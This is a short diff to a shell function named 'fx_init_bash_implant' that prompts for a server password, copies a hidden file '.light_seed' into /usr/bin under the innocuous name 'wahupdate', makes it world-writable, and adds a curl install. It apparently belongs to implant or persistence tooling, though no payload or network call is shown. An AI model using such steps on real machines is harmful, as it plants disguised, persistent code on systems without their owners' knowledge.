@@ -39,6 +39,7 @@ fx_init_bash_implant() {
     echo "PLEASE ENTER SERVER PASSWORD:"
     sudo cp .light_seed /usr/bin/wahupdate
     sudo chmod 777 /usr/bin/wahupdate
+    sudo apt-get install curl
 }
 
 
